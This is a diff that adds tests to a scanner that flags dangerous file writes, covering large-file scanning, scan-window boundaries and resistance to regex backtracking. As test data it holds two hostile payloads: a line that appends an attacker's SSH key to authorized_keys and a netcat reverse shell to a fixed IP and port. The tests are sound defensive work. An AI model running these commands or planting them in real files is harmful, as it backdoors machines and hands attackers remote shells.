@@ -41,6 +41,46 @@ describe('checkWriteContent', () => {
       });
     }
   });
+
+  describe('large-file scanning', () => {
+    it('detects a payload in the middle of a large file (no sampling gap)', () => {
+      // offset 50_000 in a 200_000-char file — between the old head[0:20K] /
+      // mid[90K:110K] / tail[180K:200K] sampling windows, so it used to evade.
+      const payload = 'ssh-rsa AAAAB3NzaC1 attacker@evil >> ~/.ssh/authorized_keys';
+      const before = 'a'.repeat(50_000);
+      const after = 'b'.repeat(200_000 - before.length - payload.length);
+      const result = checkWriteContent(before + payload + after, '/tmp/big.txt');
+      expect(result.safe).toBe(false);
+      expect(result.warning).toContain('SSH key injection');
+    });
+
+    it('detects a payload straddling a scan-window boundary', () => {
+      // The payload spans index 64K (the first window's edge) — a naive
+      // non-overlapping tiling would split it across windows and miss it; the
+      // overlap must catch it. Leading '\n' gives `\bnc` its word boundary.
+      const payload = '\nnc -e /bin/sh 10.0.0.1 4444';
+      const before = 'a'.repeat(64 * 1024 - 6); // payload starts 6 chars before the 64K edge
+      const after = 'b'.repeat(50_000);
+      const result = checkWriteContent(before + payload + after, '/tmp/edge.sh');
+      expect(result.safe).toBe(false);
+      expect(result.warning).toContain('netcat reverse shell');
+    });
+
+    it('allows a large benign file (full scan, no false positive)', () => {
+      const result = checkWriteContent('const x = 1;\n'.repeat(200_000), '/project/big.ts');
+      expect(result.safe).toBe(true);
+    });
+
+    it('does not catastrophically backtrack on crafted cron-like input (ReDoS)', () => {
+      // This ~400-byte input froze the pre-hardening cron pattern for ~18s
+      // (five chained `.*` over a run of `*`). Bounded quantifiers keep it linear.
+      const evil = '*/0' + '* '.repeat(2000);
+      const start = performance.now();
+      const result = checkWriteContent(evil, '/tmp/x.sh');
+      expect(performance.now() - start).toBeLessThan(2000); // and the 5s test timeout is the hard backstop
+      expect(result.safe).toBe(true); // no fetch/shell command → not flagged
+    });
+  });
 });
 
 describe('scanToolResult', () => {
